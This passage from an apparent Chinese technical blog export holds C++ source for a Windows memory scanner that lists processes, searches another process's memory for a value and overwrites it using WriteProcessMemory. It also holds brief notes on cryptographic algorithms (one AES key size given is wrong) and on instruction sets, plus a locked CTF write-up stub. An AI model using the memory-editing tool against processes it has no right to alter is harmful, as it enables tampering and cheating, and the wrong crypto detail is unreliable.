<p><img src="/2020/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps6.jpg" class="lazy" data-srcset="/2020/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps6.jpg" srcset="/images/loadingImage.gif" alt="img"></p>
<h2 id="源代码"><a class="header-anchor" href="#源代码"></a>源代码</h2>
<p>readMemory.cpp</p>
<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"stdafx.h"</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tchar.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;list&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iomanip&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;psapi.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_ADDR_NUM 1024</span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">"psapi.lib"</span>)</span>
DWORD dwProcessId[<span class="hljs-number">1024</span>], cbNeededProcess;

<span class="hljs-built_in">list</span>&lt;MEMORY_BASIC_INFORMATION&gt;	MemList ;
SYSTEM_INFO systemInfo;
MEMORYSTATUS memstatus;
<span class="hljs-built_in">list</span>&lt;DWORD&gt; AddrList;

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getSystemInfo</span><span class="hljs-params">()</span></span>;
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getProcessInfo</span><span class="hljs-params">()</span></span>;
<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">getMemoryBlock</span><span class="hljs-params">(DWORD dwProcessId)</span></span>;
<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">SearchProcessMemory</span><span class="hljs-params">(DWORD dwProcessId,DWORD dwValue)</span></span>;
<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ModifyProcessMemory</span><span class="hljs-params">(DWORD dwProcessId,DWORD dwTagAddr,DWORD dwValue)</span></span>;

<span class="hljs-keyword">int</span> _tmain(<span class="hljs-keyword">int</span> argc, _TCHAR* argv[])
&#123;
	<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"---------------系统及内存信息如下--------------"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
	getSystemInfo();

	<span class="hljs-comment">//获取当前进程信息</span>
	<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>&lt;&lt;<span class="hljs-string">"-----------------进程列表如下-----------------"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
	getProcessInfo();

	DWORD pid;
	<span class="hljs-keyword">while</span>(TRUE)&#123;
		pid=<span class="hljs-number">0</span>;
		<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"输入你需要访问的进程PID号: "</span>;
		<span class="hljs-built_in">cin</span>&gt;&gt;pid;
		<span class="hljs-keyword">if</span>(!getMemoryBlock(pid))&#123;
			<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"PID = "</span>&lt;&lt;(DWORD)pid&lt;&lt;<span class="hljs-string">" 的进程打开失败!"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
		&#125;<span class="hljs-keyword">else</span>&#123;
			<span class="hljs-keyword">char</span> c;
			<span class="hljs-keyword">int</span> mode = <span class="hljs-number">0</span>;
			<span class="hljs-keyword">while</span>(TRUE)&#123;
				<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>&lt;&lt;<span class="hljs-string">"q: 返回"</span>&lt;&lt;<span class="hljs-built_in">endl</span>&lt;&lt;<span class="hljs-string">"s: 内存查询"</span>&lt;&lt;<span class="hljs-built_in">endl</span>\
                    &lt;&lt;<span class="hljs-string">"m: 内存修改"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
				<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"输入功能对应的字母:"</span>;
				<span class="hljs-built_in">cin</span>&gt;&gt;c;
				<span class="hljs-keyword">if</span>(c==<span class="hljs-string">'q'</span>)&#123;
					<span class="hljs-keyword">break</span>;
				&#125;
				<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(c==<span class="hljs-string">'s'</span>)&#123;
					DWORD x;
					<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"输入查询的值："</span>;
					<span class="hljs-built_in">cin</span>&gt;&gt;x;
					<span class="hljs-keyword">if</span>(!SearchProcessMemory(pid,x))&#123;
						<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"查询失败!"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
					&#125;<span class="hljs-keyword">else</span>&#123;
						<span class="hljs-keyword">if</span>(AddrList.<span class="hljs-built_in">size</span>()==<span class="hljs-number">0</span>)&#123;
							<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"未查到值为 "</span>&lt;&lt;(DWORD)x\
                                &lt;&lt;<span class="hljs-string">" 的内存区域!"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
						&#125;<span class="hljs-keyword">else</span>&#123;
							<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"共查到 "</span>&lt;&lt;AddrList.<span class="hljs-built_in">size</span>()\
                                &lt;&lt;<span class="hljs-string">"个地址"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
							<span class="hljs-built_in">list</span>&lt;DWORD&gt;::iterator it;
							<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;
							<span class="hljs-keyword">for</span>(it=AddrList.<span class="hljs-built_in">begin</span>();\
                                it!=AddrList.<span class="hljs-built_in">end</span>();it++)&#123;
								<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d   0x%x \n"</span>,++i,(*it));
							&#125;
						&#125;
					&#125;
				&#125;
				<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(c==<span class="hljs-string">'m'</span>)&#123;
					DWORD addr;
					DWORD x;
					<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"要写入的内存地址(16进制)："</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
					<span class="hljs-built_in">cin</span>&gt;&gt;hex&gt;&gt;addr;
					<span class="hljs-comment">// getchar();</span>
					<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"要写入的值(10进制)："</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
					<span class="hljs-built_in">cin</span>&gt;&gt;x;
					<span class="hljs-keyword">if</span>(ModifyProcessMemory(pid,(DWORD)addr,(DWORD)x))&#123;
						<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"修改成功!"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
					&#125;<span class="hljs-keyword">else</span>&#123;
						<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"修改失败!"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
					&#125;
				&#125;
			&#125;
		&#125;
		getProcessInfo();
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;



<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getSystemInfo</span><span class="hljs-params">()</span></span>&#123;

	GetSystemInfo(&amp;systemInfo);
	<span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">15</span>)&lt;&lt;<span class="hljs-string">"进程用户区上界:"</span>&lt;&lt;setw(<span class="hljs-number">13</span>)&lt;&lt;systemInfo.lpMaximumApplicationAddress&lt;&lt;<span class="hljs-built_in">endl</span>;
	<span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">15</span>)&lt;&lt;<span class="hljs-string">"进程用户区起始:"</span>&lt;&lt;setw(<span class="hljs-number">13</span>)&lt;&lt;systemInfo.lpMinimumApplicationAddress&lt;&lt;<span class="hljs-built_in">endl</span>;
	<span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">15</span>)&lt;&lt;<span class="hljs-string">"页面大小:"</span>&lt;&lt;setw(<span class="hljs-number">13</span>)&lt;&lt;systemInfo.dwPageSize&lt;&lt;<span class="hljs-built_in">endl</span>;


	GlobalMemoryStatus(&amp;memstatus);
	<span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">15</span>)&lt;&lt;<span class="hljs-string">"物理内存使用率:"</span>&lt;&lt;setw(<span class="hljs-number">13</span>)&lt;&lt;memstatus.dwMemoryLoad&lt;&lt;<span class="hljs-built_in">endl</span>;
	<span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">15</span>)&lt;&lt;<span class="hljs-string">"总物理内存:"</span>&lt;&lt;setw(<span class="hljs-number">13</span>)&lt;&lt;memstatus.dwTotalPhys&lt;&lt;<span class="hljs-built_in">endl</span>;
	<span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">15</span>)&lt;&lt;<span class="hljs-string">"可用物理内存:"</span>&lt;&lt;setw(<span class="hljs-number">13</span>)&lt;&lt;memstatus.dwAvailPhys&lt;&lt;<span class="hljs-built_in">endl</span>;
	<span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">15</span>)&lt;&lt;<span class="hljs-string">"总页文件:"</span>&lt;&lt;setw(<span class="hljs-number">13</span>)&lt;&lt;memstatus.dwTotalPageFile&lt;&lt;<span class="hljs-built_in">endl</span>;
	<span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">15</span>)&lt;&lt;<span class="hljs-string">"可用页文件:"</span>&lt;&lt;setw(<span class="hljs-number">13</span>)&lt;&lt;memstatus.dwAvailPageFile&lt;&lt;<span class="hljs-built_in">endl</span>;
	<span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">15</span>)&lt;&lt;<span class="hljs-string">"总虚拟内存:"</span>&lt;&lt;setw(<span class="hljs-number">13</span>)&lt;&lt;memstatus.dwTotalVirtual&lt;&lt;<span class="hljs-built_in">endl</span>;
	<span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">15</span>)&lt;&lt;<span class="hljs-string">"可用虚拟内存:"</span>&lt;&lt;setw(<span class="hljs-number">13</span>)&lt;&lt;memstatus.dwAvailVirtual&lt;&lt;<span class="hljs-built_in">endl</span>;
&#125;


<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getProcessInfo</span><span class="hljs-params">()</span></span>&#123;
	<span class="hljs-comment">//为进程列表拍摄快照</span>
    HANDLE hProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,<span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span>(hProcessSnap==INVALID_HANDLE_VALUE)&#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"CreateToolhelp32Snapshot调用失败!\n"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
    &#125;

    PROCESSENTRY32 pe32;
    pe32.dwSize = <span class="hljs-keyword">sizeof</span>(PROCESSENTRY32);
    <span class="hljs-comment">//遍历进程快照。轮流显示每个进程的信息</span>
    BOOL bMore=Process32First(hProcessSnap,&amp;pe32);
    <span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"PID\t线程数\t进程名称\n"</span>);
    <span class="hljs-keyword">while</span>(bMore)&#123;

        bMore=Process32Next(hProcessSnap,&amp;pe32);
        _tprintf(_T(<span class="hljs-string">"%u\t"</span>),pe32.th32ProcessID);
        _tprintf(_T(<span class="hljs-string">"%u\t"</span>),pe32.cntThreads);
        _tprintf(_T(<span class="hljs-string">"%s\n"</span>),pe32.szExeFile);

        i++;
    &#125;
    <span class="hljs-comment">//清除snapshot对象</span>
    CloseHandle(hProcessSnap);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"进程总数:%d\n"</span>,i);
&#125;


<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">getMemoryBlock</span><span class="hljs-params">(DWORD dwProcessId)</span></span>&#123;
	MemList.<span class="hljs-built_in">clear</span>();
	HANDLE hProcess =INVALID_HANDLE_VALUE;
	<span class="hljs-keyword">if</span>(dwProcessId != GetCurrentProcessId())&#123;
		hProcess = OpenProcess( PROCESS_QUERY_INFORMATION|\
                               PROCESS_VM_READ,FALSE , dwProcessId);
	&#125;
	<span class="hljs-keyword">if</span>(hProcess == <span class="hljs-literal">NULL</span>)&#123;
		<span class="hljs-keyword">return</span> FALSE;
	&#125;
	MEMORY_BASIC_INFORMATION  MemBaseInfo;
	DWORD  dwInfoSize = <span class="hljs-keyword">sizeof</span>(MEMORY_BASIC_INFORMATION);
	DWORD  dwCurPos = (DWORD)systemInfo.lpMinimumApplicationAddress;
	<span class="hljs-keyword">while</span>(dwCurPos &lt; (DWORD) systemInfo.lpMaximumApplicationAddress )&#123;
		VirtualQueryEx( hProcess,(LPVOID)dwCurPos , &amp;MemBaseInfo,dwInfoSize);
		MemList.push_back(MemBaseInfo);
		dwCurPos = (DWORD) MemBaseInfo.BaseAddress + MemBaseInfo.RegionSize ;
	&#125;
	<span class="hljs-built_in">list</span>&lt;MEMORY_BASIC_INFORMATION&gt;::iterator it = MemList.<span class="hljs-built_in">begin</span>();
	<span class="hljs-keyword">int</span> num=<span class="hljs-number">0</span>;
	dwCurPos = (DWORD)(*it).BaseAddress;
	<span class="hljs-keyword">for</span>( ;it != MemList.<span class="hljs-built_in">end</span>(); it++)&#123;
		<span class="hljs-built_in">cout</span>&lt;&lt;dec&lt;&lt;<span class="hljs-string">"---- "</span>&lt;&lt;++num&lt;&lt;<span class="hljs-string">" ----"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
		<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"内存块基址: 0x"</span>&lt;&lt;hex&lt;&lt;dwCurPos&lt;&lt;<span class="hljs-built_in">endl</span>;
		<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"保护方式："</span>&lt;&lt;(*it).AllocationProtect&lt;&lt;<span class="hljs-built_in">endl</span>;
		<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"区域大小："</span>&lt;&lt;(*it).RegionSize&lt;&lt;<span class="hljs-built_in">endl</span>;
		<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"状态："</span>;
		<span class="hljs-keyword">if</span>((*it).State == MEM_COMMIT)&#123;
			<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"提交"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
		&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((*it).State == MEM_FREE)&#123;
			<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"空闲"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
		&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((*it).State == MEM_RESERVE)&#123;
			<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"保留"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
		&#125;<span class="hljs-keyword">else</span>&#123;&#125;
		<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"访问保护方式："</span>;
		<span class="hljs-keyword">if</span>((*it).Protect == PAGE_READONLY)&#123;
			<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"只读"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
		&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((*it).Protect == PAGE_READWRITE )&#123;
			<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"读/写"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
		&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((*it).Protect == PAGE_EXECUTE)&#123;
			<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"可执行"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
		&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((*it).Protect == PAGE_EXECUTE_READ)&#123;
			<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"可执行/读"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
		&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((*it).Protect == PAGE_EXECUTE_READWRITE)&#123;
			<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"可执行/读写"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
		&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((*it).Protect == PAGE_NOACCESS)&#123;
			<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"不允许存储"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
		&#125;
		<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"类型："</span>;
		<span class="hljs-keyword">if</span>((*it).Type == MEM_IMAGE)&#123;
			<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"映像"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
		&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((*it).Type == MEM_MAPPED)&#123;
			<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"映射"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
		&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((*it).Type == MEM_PRIVATE)&#123;
			<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"私有"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
		&#125;<span class="hljs-keyword">else</span>&#123;&#125;
		dwCurPos+=(*it).RegionSize ;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
&#125;


<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">SearchProcessMemory</span><span class="hljs-params">(DWORD dwProcessId,DWORD dwValue)</span></span>&#123;
	AddrList.<span class="hljs-built_in">clear</span>();
	<span class="hljs-keyword">if</span>(MemList.empty())&#123;
		<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
	&#125;
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	<span class="hljs-keyword">if</span>(dwProcessId !=GetCurrentProcessId())&#123;
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,\
                               FALSE,dwProcessId);
		<span class="hljs-keyword">if</span>(hProcess ==<span class="hljs-literal">NULL</span>)
			<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
	&#125;
	LPBYTE lpBuff = <span class="hljs-keyword">new</span> BYTE[systemInfo.dwPageSize];
	<span class="hljs-built_in">list</span>&lt;MEMORY_BASIC_INFORMATION&gt;::iterator it;
	<span class="hljs-keyword">for</span>(it=MemList.<span class="hljs-built_in">begin</span>();it!=MemList.<span class="hljs-built_in">end</span>();it++)&#123;
		<span class="hljs-keyword">if</span>(it-&gt;State != MEM_COMMIT)&#123;
			<span class="hljs-keyword">continue</span>;
		&#125;
		DWORD dwSize =<span class="hljs-number">0</span>;
		SIZE_T dwReadBytes=<span class="hljs-number">0</span>;
		<span class="hljs-keyword">while</span>(dwSize &lt; it-&gt;RegionSize)&#123;
			LPVOID lpAddr = (LPVOID)((DWORD)it-&gt;BaseAddress+dwSize);
            <span class="hljs-keyword">if</span>(ReadProcessMemory(hProcess,lpAddr,lpBuff,\
                                 systemInfo.dwPageSize,\
                                 &amp;dwReadBytes)==FALSE)&#123;
				dwSize +=systemInfo.dwPageSize;
				<span class="hljs-keyword">continue</span>;
			&#125;
			<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;dwReadBytes <span class="hljs-number">-3</span>;i++)&#123;
				<span class="hljs-keyword">if</span>(*((DWORD *)(lpBuff+i)) ==dwValue)&#123;
					AddrList.push_back((DWORD)lpAddr+i);
				&#125;
				<span class="hljs-keyword">if</span>(AddrList.<span class="hljs-built_in">size</span>()==MAX_ADDR_NUM)&#123;
					<span class="hljs-keyword">delete</span> []lpBuff;
					CloseHandle(hProcess);
					<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
				&#125;
			&#125;
			dwSize+=systemInfo.dwPageSize;
		&#125;
	&#125;
	<span class="hljs-keyword">delete</span> []lpBuff;
	CloseHandle(hProcess);
	<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
&#125;


<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ModifyProcessMemory</span><span class="hljs-params">(DWORD dwProcessId,DWORD dwTagAddr,\</span></span>
<span class="hljs-function"><span class="hljs-params">                         DWORD dwValue)</span></span>&#123;
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	<span class="hljs-keyword">if</span>(dwProcessId !=GetCurrentProcessId())&#123;
		hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcessId);
		<span class="hljs-keyword">if</span>(hProcess ==<span class="hljs-literal">NULL</span>)
			<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
	&#125;
	SIZE_T dwWriteBytes =<span class="hljs-number">0</span>;
	DWORD dwOldProtect;
	<span class="hljs-keyword">if</span>(!VirtualProtectEx(hProcess,(LPVOID)dwTagAddr,<span class="hljs-keyword">sizeof</span>(DWORD),\
                         PAGE_EXECUTE_READWRITE,&amp;dwOldProtect))&#123;
		<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"protect!"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
		DWORD dwReturn = GetLastError();
		<span class="hljs-built_in">cout</span>&lt;&lt;dwReturn&lt;&lt;<span class="hljs-built_in">endl</span>;
	&#125;
	<span class="hljs-keyword">if</span>(!WriteProcessMemory(hProcess,(LPVOID)dwTagAddr,\
                           &amp;dwValue,<span class="hljs-keyword">sizeof</span>(DWORD),&amp;dwWriteBytes))&#123;
		<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"write failed"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;
		DWORD dwReturn = GetLastError();
		<span class="hljs-built_in">cout</span>&lt;&lt;dwReturn&lt;&lt;<span class="hljs-built_in">endl</span>;
		<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
	&#125;
	VirtualProtectEx(hProcess,(LPVOID)dwTagAddr,\
                     <span class="hljs-keyword">sizeof</span>(DWORD),dwOldProtect,<span class="hljs-literal">NULL</span>);
	CloseHandle(hProcess);
		<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
&#125;</code></pre>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>小工具</tag>
      </tags>
  </entry>
  <entry>
    <title>密码算法</title>
    <url>/2021/08/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="对称加密"><a class="header-anchor" href="#对称加密"></a>对称加密</h2>
<ul>
<li>DES（Data Encryption Standard）：数据加密标准，速度较快，适用于加密大量数据的场合；</li>
<li>3DES（Triple DES）：是基于DES，对一块数据用三个不同的密钥进行三次加密，强度更高；</li>
<li>AES（Advanced Encryption Standard）：高级加密标准，是下一代的加密算法标准，速度快，安全级别高，支持128、192、256、512位密钥的加密；</li>
<li>RC2：分组加密，输入输出均为64位</li>
<li>RC4：流密码</li>
<li>Blowfish：区块加密算法</li>
</ul>
<h2 id="非对称加密"><a class="header-anchor" href="#非对称加密"></a>非对称加密</h2>
<ul>
<li>
<p>RSA：基于大数分解难题</p>
<ul>
<li>随意选择两个大的质数p和q，p不等于q，计算N = pq.</li>
<li>根据欧拉函数，求得r=φ(N)=φ§φ(q)=(p-1)(q-1)。</li>
<li>选择一个小于r的整数e,是e与r互质。并求得e关于r的模反元素，命名为d。(求d令ed≡1(mod r))。(模反元素存在，当且仅当e与r互质）</li>
<li>将p和q的记录销毁。</li>
</ul>
<p>其中(N，e)是公钥，(N，d)是私钥。</p>
<p>参考：<a href="https://blog.csdn.net/gao131360144/article/details/79966094">https://blog.csdn.net/gao131360144/article/details/79966094</a></p>
</li>
<li>
<p>DSA：基于整数有限域离散对数难题</p>
</li>
<li>
<p>ECC：椭圆曲线</p>
</li>
</ul>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>密码算法</tag>
      </tags>
  </entry>
  <entry>
    <title>指令集和操作系统位数</title>
    <url>/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E6%8C%87%E4%BB%A4%E9%9B%86%E5%92%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%8D%E6%95%B0/</url>
    <content><![CDATA[<h2 id="指令集"><a class="header-anchor" href="#指令集"></a>指令集</h2>
<p>为了提高编写和运行程序的效率，将一些较为常用的指令（如积分，微分，乘除法等）写成一套标准的程序，即指令集。</p>
<h3 id="X86和ARM"><a class="header-anchor" href="#X86和ARM"></a>X86和ARM</h3>
<p>完整的，复杂的指令集称作<code>CISC</code> (Complex Instruction Set Computing)，在复杂指令集中许多运算是不常用的，让CPU支持所有指令是对晶体管的严重浪费，所以亨尼西和帕特森等人提出了一种更加简单的指令集，叫做精简指令集<code>RISC</code> (Reduced Instruction Set Computing)</p>
<p><code>X86</code>是英特尔推出的一种CPU架构，采用复杂指令集CISC</p>
<p><code>ARM</code>是acorn公司设计的CPU架构，采用精简指令集RISC</p>
<h2 id="操作系统位数"><a class="header-anchor" href="#操作系统位数"></a>操作系统位数</h2>
<p>首先明确<code>CPU位数</code>的概念，CPU位数即CPU在一个时钟周期内能够处理的二进制串的位数，也是CPU寄存器的位数。目前64位的CPU是主流。</p>
<p>而<strong>操作系统位数</strong>即操作系统所依赖的指令集位数，可以理解为：32位的操作系统假定CPU是32位的，64位操作系统则假定CPU是64位的。所以，64位CPU的主机可以安装64位和32位甚至更低位数的操作系统，而32位CPU的主机只能安装32位及以下的操作系统（即向下兼容）。</p>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>ACTF校赛WriteUp</title>
    <url>/2020/06/05/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-CTF%E9%A2%98%E8%A7%A3/ACTF%E6%A0%A1%E8%B5%9BWriteUp/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>国赛2020WriteUp</title>
    <url>/2020/08/22/%E6%9D%82%E8%AE%B0/%E5%88%86%E7%B1%BB-CTF%E9%A2%98%E8%A7%A3/%E5%9B%BD%E8%B5%9B2020WriteUp/</url>
